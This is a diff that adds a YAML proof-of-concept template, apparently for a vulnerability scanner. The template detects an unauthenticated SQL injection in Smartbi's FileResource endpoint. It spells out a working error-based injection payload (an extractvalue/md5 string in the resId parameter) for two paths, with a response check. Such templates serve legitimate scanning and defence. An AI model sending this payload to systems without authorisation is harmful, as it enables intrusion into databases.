@@ -1,0 +1,36 @@
+name: poc-yaml-smartbi-unauthenticated-sqli
+binding: 109a32eb-5809-4e89-9aa2-b52a6001175d
+manual: true
+detail:
+    author: secking
+    links:
+        - https://mp.weixin.qq.com/s/yeMhVYJks_wf6Po-sA6iOg
+    vulnerability:
+        id: CT-529826
+        level: high
+    description: smartbi 前台SQL注入
+transport: http
+set:
+    num: randomLowercase(5)
+    md5num: md5(num)
+    subst: substr(md5num, 6, 28)
+rules:
+    r0:
+        request:
+            cache: false
+            method: POST
+            path: /vision/FileResource
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: op=OPEN&resId=LOGIN_BG_IMG%27%20AND%20extractvalue(1,concat(0,md5('{{num}}')))--+
+        expression: response.status == 200 && response.body.bcontains(bytes(subst))
+    r1:
+        request:
+            cache: false
+            method: POST
+            path: /smartbi/vision/FileResource
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: op=OPEN&resId=LOGIN_BG_IMG%27%20AND%20extractvalue(1,concat(0,md5('{{num}}')))--+
+        expression: response.status == 200 && response.body.bcontains(bytes(subst))
+expression: r0() || r1()
